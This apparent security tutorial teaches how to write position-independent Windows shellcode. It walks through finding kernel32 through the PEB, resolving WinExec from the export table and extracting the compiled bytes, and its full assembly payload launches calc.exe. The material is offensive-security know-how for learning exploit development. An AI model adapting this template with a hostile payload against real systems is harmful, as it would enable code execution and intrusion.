> This article was first published on the [Xianzhi Community](https://xz.aliyun.com/t/10078).

## What is Shellcode?

> Shellcode is a specially designed, position-independent binary code that is typically used as a payload in exploits to perform specific operations, such as spawning a shell or gaining control over a system.

To write position-independent code, the following points should be taken into account:

- The string must be stored dynamically on the stack.
- **Function Addressing in DLLs**: Due to ASLR (Address Space Layout Randomization), DLLs do not load at the same address every time. You can locate loaded modules through PEB.PEB_LDR_DATA to call their exported functions or load a new DLL.
- **Avoid Null Bytes**: A `NULL` byte (`0x00`) is treated as a string terminator in C/C++ code. If `NULL` bytes appear in the shellcode, they may interfere with the functionality of the target application, and the shellcode might fail to copy correctly into memory.

    `mov ebx, 0x00` you can use the following equivalent instruction to avoid null bytes: `xor ebx, ebx`.
- Character Restrictions: In certain scenarios, shellcode must also avoid characters like \r or \n and may even need to use alphanumeric-only characters.

## The Mechanism Behind DLL Loading on Windows

In Windows, applications cannot directly access system calls. Instead, they use functions from the Windows API (WinAPI), which are stored in DLLs such as `kernel32.dll`, `advapi32.dll`, `gdi32.dll`, etc. `ntdll.dll` and `kernel32.dll` are especially important, as every process imports them.

Here is the program I wrote, called [nothing_to_do](https://github.com/ac0d3r/0xpe/blob/master/shellcode/nothing_to_do.cpp). I used [listdlls](https://docs.microsoft.com/en-us/sysinternals/downloads/listdlls) to list the imported DLLs.


![image](https://github.com/user-attachments/assets/b1cb2274-5d78-412b-a578-03fa5b80621e)

## DLL Addressing

The [TEB (Thread Environment Block)](https://en.wikipedia.org/wiki/Win32_Thread_Information_Block) structure contains thread information in user mode. On 32-bit systems, we can use the `FS` register to find the address of the [PEB (Process Environment Block)](https://en.wikipedia.org/wiki/Process_Environment_Block) at offset `0x30`.

`PEB.ldr` points to the `PEB_LDR_DATA` structure, which contains information about the loaded modules, including the base addresses of `kernel32` and `ntdll`.

```c++
typedef struct _PEB_LDR_DATA {
  BYTE       Reserved1[8];
  PVOID      Reserved2[3];
  LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;
```

`PEB_LDR_DATA.InMemoryOrderModuleList` contains the head of a doubly linked list of the modules loaded in the process. Each entry in the list is a pointer to an `LDR_DATA_TABLE_ENTRY` structure.

```c++
typedef struct _LIST_ENTRY
{
     PLIST_ENTRY Flink;
     PLIST_ENTRY Blink;
} LIST_ENTRY, *PLIST_ENTRY;
```

Information about the loaded DLL in `LDR_DATA_TABLE_ENTRY`:

```c++
typedef struct _LDR_DATA_TABLE_ENTRY {
    PVOID Reserved1[2];
    LIST_ENTRY InMemoryOrderLinks;
    PVOID Reserved2[2];
    PVOID DllBase;
    PVOID EntryPoint;
    PVOID Reserved3;
    UNICODE_STRING FullDllName;
    BYTE Reserved4[8];
    PVOID Reserved5[3];
    union {
        ULONG CheckSum;
        PVOID Reserved6;
    };
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
```


> **Tips:**
  In Windows versions prior to Vista, the first two DLLs in `InInitializationOrderModuleList` are `ntdll.dll` and `kernel32.dll`, but for Vista and later versions, the second DLL is changed to `kernelbase.dll`.
In `InMemoryOrderModuleLis`t, the first entry is `calc.exe` (the executable), the second is `ntdll.dll`, and the third is `kernel32.dll`. This method currently applies to all versions of Windows and is the preferred approach.

### Kernel32.dll Addressing Process:

![image](https://github.com/user-attachments/assets/7cf0ef92-56ac-4a54-999f-7d21d1ce4f9d)

Implementing with Assembly Code:
```ASM
xor ecx, ecx
mov ebx, fs:[ecx + 0x30]    ; *ebx = PEB base address
mov ebx, [ebx+0x0c]         ; ebx = PEB.Ldr
mov esi, [ebx+0x14]         ; ebx = PEB.Ldr.InMemoryOrderModuleList
lodsd                       ; eax = Second module
xchg eax, esi               ; eax = esi, esi = eax
lodsd                       ; eax = Third(kernel32)
mov ebx, [eax + 0x10]       ; ebx = dll Base address
```

### Function Addressing in Kernel32.dll Export Table

> Previously, I studied PE structure-related materials [here](https://github.com/ac0d3r/0xpe/tree/master/pe-demo).

`ImageOptionalHeader32.DataDirectory[0].VirtualAddress` points to the Export Table RVA. The structure of the Export Table is as follows:

```c++
typedef struct _IMAGE_EXPORT_DIRECTORY {
    DWORD   Characteristics;
    DWORD   TimeDateStamp;      // Timestamp
    WORD    MajorVersion;
    WORD    MinorVersion;
    DWORD   Name;               // Pointer to the export table's filename string
    DWORD   Base;               // Starting ordinal of the export table
    DWORD   NumberOfFunctions;  // Number of exported functions (more accurately, the number of elements in AddressOfFunctions, not the number of functions)
    DWORD   NumberOfNames;      // Number of functions exported by name
    DWORD   AddressOfFunctions;     // Exported function address table RVA: stores the addresses of all exported functions (table element width is 4, total size is NumberOfFunctions * 4)
    DWORD   AddressOfNames;         // Exported function names table RVA: stores the addresses of function name strings (table element width is 4, total size is NumberOfNames * 4)
    DWORD   AddressOfNameOrdinals;  // Exported function ordinal table RVA: stores the function ordinals (table element width is 2, total size is NumberOfNames * 2)
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
```

![image](https://github.com/user-attachments/assets/a0a43d0e-ab05-4793-a286-67a287e13a94)

Implementing with Assembly Code:
```ASM
;; Find PE export table
mov edx, [ebx + 0x3c]   ; Find the e_lfanew offset in the DOS header
add edx, ebx            ; edx =  pe header
mov edx, [edx + 0x78]   ; edx = offset export table
add edx, ebx            ; edx = export table
mov esi, [edx + 0x20]   ; esi = offset names table
add esi, ebx            ; esi = names table

;; Find the `Winexec` Function Name
xor ecx, ecx
Get_Function:
    inc ecx                         ; ecx++
    lodsd                           ; eax = Next function name string RVA
    add eax, ebx                    ; eax = Function name string pointer
    cmp dword ptr[eax], 0x456E6957  ; eax[0:4] == EniW
    jnz Get_Function
dec ecx;

;;Find the Winexec Function Pointer
mov esi, [edx + 0x24]     ; esi = ordianl table rva
add esi, ebx              ; esi = ordianl table
mov cx, [esi + ecx * 2]   ; ecx = func ordianl
mov esi, [edx + 0x1c]     ; esi = address table rva
add esi, ebx              ; esi = address table
mov edx, [esi + ecx * 4]  ; edx = func address rva
add edx, ebx              ; edx = func address

;; Call the Winexec Function
xor eax, eax
push edx
push eax        ; 0x00
push 0x6578652e
push 0x636c6163
push 0x5c32336d
push 0x65747379
push 0x535c7377
push 0x6f646e69
push 0x575c3a43
mov esi, esp    ; esi = "C:\\Windows\\System32\\calc.exe"
push 10         ; window state SW_SHOWDEFAULT
push esi        ; "C:\\Windows\\System32\\calc.exe"
call edx        ; WinExec(esi, 10)
```

Final [Code](https://github.com/ac0d3r/0xpe/blob/master/shellcode/shellcode.cpp):

```C++
int main()
{
    __asm {
        ; Find where kernel32.dll is loaded into memory
        xor ecx, ecx
        mov ebx, fs:[ecx + 0x30]    ; *ebx = PEB base address
        mov ebx, [ebx+0x0c]         ; ebx = PEB.Ldr
        mov esi, [ebx+0x14]         ; ebx = PEB.Ldr.InMemoryOrderModuleList
        lodsd                       ; eax = Second module
        xchg eax, esi               ; eax = esi, esi = eax
        lodsd                       ; eax = Third(kernel32)
        mov ebx, [eax + 0x10]       ; ebx = dll Base address

        ;; Find PE export table
        mov edx, [ebx + 0x3c]   ; Find the e_lfanew offset in the DOS header
        add edx, ebx            ; edx =  pe header
        mov edx, [edx + 0x78]   ; edx = offset export table
        add edx, ebx            ; edx = export table
        mov esi, [edx + 0x20]   ; esi = offset names table
        add esi, ebx            ; esi = names table

        ;; Find the `Winexec` Function Name
        xor ecx, ecx
        Get_Function:
            inc ecx                         ; ecx++
            lodsd                           ; eax = Next function name string RVA
            add eax, ebx                    ; eax = Function name string pointer
            cmp dword ptr[eax], 0x456E6957  ; eax[0:4] == EniW
            jnz Get_Function
        dec ecx;

        ;;Find the Winexec Function Pointer
        mov esi, [edx + 0x24]     ; esi = ordianl table rva
        add esi, ebx              ; esi = ordianl table
        mov cx, [esi + ecx * 2]   ; ecx = func ordianl
        mov esi, [edx + 0x1c]     ; esi = address table rva
        add esi, ebx              ; esi = address table
        mov edx, [esi + ecx * 4]  ; edx = func address rva
        add edx, ebx              ; edx = func address

        ;; Call the Winexec Function
        xor eax, eax
        push edx
        push eax        ; 0x00
        push 0x6578652e
        push 0x636c6163
        push 0x5c32336d
        push 0x65747379
        push 0x535c7377
        push 0x6f646e69
        push 0x575c3a43
        mov esi, esp    ; esi = "C:\\Windows\\System32\\calc.exe"
        push 10         ; window state SW_SHOWDEFAULT
        push esi        ; "C:\\Windows\\System32\\calc.exe"
        call edx        ; WinExec(esi, 10)

        ; exit
        add esp, 0x1c
        pop eax
        pop edx
    }
    return 0;
}
```

It was compiled using `Visual Studio`, resulting in a very large size. By rewriting it in `MASM`, I was able to produce a much smaller file: [shellcode.asm](https://github.com/ac0d3r/0xpe/blob/master/shellcode/shellcode.asm).


## Extract Shellcode

Compile MASM:
```Bash
F:\\> ml -c -coff .\\shellcode.asm
F:\\> link -subsystem:windows .\\shellcode.obj
```

There are two methods to extract shellcode:
1. Use dumpbin.exe: `$ dumpbin.exe /ALL .\\shellcode.obj`
![image](https://github.com/user-attachments/assets/8aac56ce-7a6e-45df-a7f4-d7caeae00af4)
2. Extract the PE .text section Data: starting from PointerToRawData, and retrieve data of size VirtualSize:
![image](https://github.com/user-attachments/assets/a423e706-9afa-4435-86a3-c3aaff668234)

## Shellcode Loader
Write a loader in Golang, code: [loader.go](https://github.com/ac0d3r/0xpe/blob/master/shellcode/loader.go). Compile using the [Makefile](https://github.com/ac0d3r/0xpe/blob/master/shellcode/Makefile), and the run it:

You did it 🎉
![](https://github.com/user-attachments/assets/17ce5763-8850-409e-a4a5-20ef1986139d)

## Reference

- https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html
- https://securitycafe.ro/2015/10/30/introduction-to-windows-shellcode-development-part1/
- https://securitycafe.ro/2015/12/14/introduction-to-windows-shellcode-development-part-2/
- https://securitycafe.ro/2016/02/15/introduction-to-windows-shellcode-development-part-3/

<!-- ##{"timestamp":1630316468}## -->